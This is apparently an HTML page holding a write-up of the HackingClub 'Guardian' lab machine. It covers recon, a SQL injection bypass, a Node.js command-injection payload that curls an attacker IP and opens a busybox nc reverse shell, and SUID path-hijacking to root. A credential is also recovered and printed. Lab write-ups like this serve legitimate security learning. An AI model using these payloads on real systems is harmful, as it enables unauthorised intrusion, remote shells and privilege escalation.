@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[HC] Guardian - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <h1>[HackingClub] Guardian Writeup</h1>
+                
+                <div class="box-info">
+                    <table>
+                        <tr>
+                            <td>Platform:</td>
+                            <td>HackingClub</td>
+                        </tr>
+                        <tr>
+                            <td>Machine:</td>
+                            <td>Guardian</td>
+                        </tr>
+                        <tr>
+                            <td>Category:</td>
+                            <td>Web Exploitation</td>
+                        </tr>
+                        <tr>
+                            <td>OS:</td>
+                            <td>Linux</td>
+                        </tr>
+                        <tr>
+                            <td>Difficulty:</td>
+                            <td><span class="difficulty easy">Easy</span></td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="tags" style="margin-bottom: 30px;">
+                    <span class="tag">sql injection</span>
+                    <span class="tag">rce</span>
+                    <span class="tag">reverse engineering</span>
+                    <span class="tag">path-hijacking</span>
+                </div>
+
+                <img src="../../images/hackingclub/guardian/index.png" alt="Guardian Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>## Recon</h2>
+                
+                <p>At the beginning, I used <code>nmap</code> with the following parameters to scan the target.</p>
+
+                <pre><code>┌─[ribeirin@parrot]─[~/Documents/machines/hackingclub/guardian]
+└──╼ $sudo nmap -sSVC -Pn -T5 --min-rate 2000 172.16.7.194 -p-
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-26 22:46 -03
+Nmap scan report for 172.16.7.194
+Host is up (0.15s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e9:d3:ea:ff:b8:2f:a6:39:f8:af:75:1d:ca:b5:aa:59 (ECDSA)
+|_  256 2e:2d:59:6e:f9:5b:83:ea:5b:ff:31:c5:0c:33:20:6e (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+| http-title: Guardian Insurance
+|_Requested resource was /login
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The scan revealed only ports 22 (SSH) and 80 (HTTP) as open. Below, we can see that there is a redirect to the <code>/login</code> page, indicating that authentication is required. Additionally, the application is using <code>Express.js</code> as its web framework, which suggests that it is built with Node.js.</p>
+
+                <pre><code>┌─[ribeirin@parrot]─[~/Documents/machines/hackingclub/guardian]
+└──╼ $curl -I 172.16.7.194
+HTTP/1.1 302 Found
+Server: nginx/1.24.0 (Ubuntu)
+Date: Thu, 27 Feb 2025 01:45:42 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 28
+Connection: keep-alive
+X-Powered-By: Express
+Location: /login
+Vary: Accept
+Set-Cookie: connect.sid=s%3ARXUeGLySkK468RfGVU4pe8Y1Is1B8Wgg.b23S0dXS0oZ7kV9WD5ix4UWkZaeImFr2krPARKPep6Y; Path=/; HttpOnly</code></pre>
+
+                <p>First, I performed fuzzing on the web application using <code>ffuf</code> to discover hidden directories and files:</p>
+
+                <pre><code>┌─[ribeirin@parrot]─[~/Documents/machines/hackingclub/guardian]
+└──╼ $ffuf -u http://172.16.7.194/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 100
+
+images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 166ms]
+js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 219ms]
+logout                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 282ms]
+login                   [Status: 200, Size: 2707, Words: 661, Lines: 52, Duration: 280ms]
+customers               [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 187ms]</code>
+                </pre><pre><code>┌─[ribeirin@parrot]─[~/Documents/machines/hackingclub/guardian]
+└──╼ $ffuf -u http://172.16.7.194/js/FUZZ -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/js.txt -t 100
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://172.16.7.194/js/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/js.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+login.js                [Status: 200, Size: 967, Words: 219, Lines: 36, Duration: 182ms]
+utils.js                [Status: 200, Size: 1817, Words: 575, Lines: 68, Duration: 184ms]
+register.js             [Status: 200, Size: 1535, Words: 400, Lines: 47, Duration: 221ms]
+:: Progress: [3550/3550] :: Job [1/1] :: 515 req/sec :: Duration: [0:00:07] :: Errors: 0 ::</code>
+</pre>
+
+
+                <p>The discovered directories and JavaScript files provide valuable insights into the application's structure. By analyzing the JavaScript files, we identified the following API endpoints:</p>
+
+                <pre><code>images/
+login/
+logout/
+customers/
+js/
+
+js/login.js
+js/utils.js
+js/register.js
+
+POST to /api/auth/login
+POST to /api/auth/first-access/register
+GET to /api/auth/verify
+POST to /api/rest/execute</code></pre>
+                
+                <p>Additionally, while interacting with the web application, we observed another endpoint: <code>POST to /api/auth/first-access.</code> </p>
+                <img src="../../images/hackingclub/guardian/recon.png" alt="Recon" style="max-width: 100%; margin: 20px 0;">
+
+                <h2>## Exploitation</h2>
+                
+                <p>The analysis of <code>utils.js</code> reveals two functions, <code>getCompany()</code> and <code>getCustomers()</code>, which send POST requests to <code>/api/rest/execute</code> with a JSON payload.</p>
+
+                <pre><code>JSON.stringify({action: `db.getClients('${user.EIN}')`})</code></pre>
+                    
+                <p>This suggests that the application dynamically executes queries based on user input, which could potentially lead to Remote Code Execution (RCE). However, to explore this endpoint, a valid authentication token (cookie) is required.</p>
+
+                <p>In the <code>/first-access</code> registration process, there is an Employer Identification Number (EIN) input field. When a request is made to verify the EIN, the application sends a request to: POST <code>/api/auth/first-access</code>. We can test 
+                sending just only quote to test the app.</p>
+                
+                <img src="../../images/hackingclub/guardian/error_ein.png" alt="EIN Error" style="max-width: 100%; margin: 20px 0;">
+
+                <p>By testing the payload: <code>' or 1=1#</code> we successfully bypassed the EIN verification and obtained a list of valid EINs. This confirms that the application is vulnerable to SQL Injection.</p>
+
+                <img src="../../images/hackingclub/guardian/sql_injection.png" alt="SQL Injection" style="max-width: 100%; margin: 20px 0;">
+
+                <p>To register using the obtained EIN (56-7890123), we need to send a POST request to <code>/api/auth/first-access/register</code> with the required parameters.</p>
+                <img src="../../images/hackingclub/guardian/register.png" alt="Register" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Now that we have registered an account, we need to log in to obtain an authentication token.</p>
+                <img src="../../images/hackingclub/guardian/login.png" alt="Login" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Now that we have obtained a JWT, we can add <code>Authorization: Bearer TOKEN</code> in our request header.</p>
+
+                <p>Since the vulnerability in utils.js seems to be exploitable, let's craft and test Remote Code Execution (RCE) payloads for Node.js.</p>
+                <img src="../../images/hackingclub/guardian/testing.png" alt="Testing" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Using the following payload:</p>
+                <pre><code>{"action":"db.getClients('56-7890123')\nrequire('child_process').exec('curl 10.0.10.235:4444')"}</code></pre>
+                <img src="../../images/hackingclub/guardian/command_injection.png" alt="Command Injection" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Great! Now that we have confirmed Remote Code Execution (RCE), you can use the following payload to execute system commands:</p>
+                <pre><code>{"action":"db.getClients('56-7890123')\nrequire('child_process').exec('busybox nc 10.0.10.235 4444 -e sh')"}</code></pre>
+                <img src="../../images/hackingclub/guardian/rce.png" alt="RCE" style="max-width: 100%; margin: 20px 0;">
+
+                <h2>## Post Exploitation</h2>
+                
+                <p>Inside <code>/opt</code> we have a binary file. Since the binary inside <code>/opt</code> has the SUID bit set, it runs with elevated privileges. If we can analyze and exploit it, we may escalate privileges to root.</p>
+                <img src="../../images/hackingclub/guardian/opt_1.png" alt="Opt 1" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/guardian/opt_2.png" alt="Opt 2" style="max-width: 100%; margin: 20px 0;">
+
+                <p>With Ghidra, we can see the following information:</p>
+
+                <p><strong>Main function</strong> - check credentials and call a binary named <code>mysqldump</code>.</p>
+                <img src="../../images/hackingclub/guardian/ghidra_1.png" alt="Ghidra 1" style="max-width: 100%; margin: 20px 0;">
+
+                <p><strong>Verify Credentials functions</strong> - give to us a login and password.</p>
+                <img src="../../images/hackingclub/guardian/ghidra_2.png" alt="Ghidra 2" style="max-width: 100%; margin: 20px 0;">
+
+                <p>So our path to get a privilege escalation it's make a <code>Path Hijacking</code> with <code>mysqldump</code> binary and login. Inside <code>/opt</code> directory:</p>
+
+                <pre><code>echo 'chmod u+s /bin/bash' > /tmp/mysqldump
+chmod +x /tmp/mysqldump
+export PATH=/tmp:$PATH
+./backup mysql_backup:7fxzh7m*</code></pre>
+
+                <img src="../../images/hackingclub/guardian/root.png" alt="Root" style="max-width: 100%; margin: 20px 0;">
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackingClub // Guardian</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
+                <a href="../../writeups.html">&lt;&lt; Back to Writeups</a>
+            </div>
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
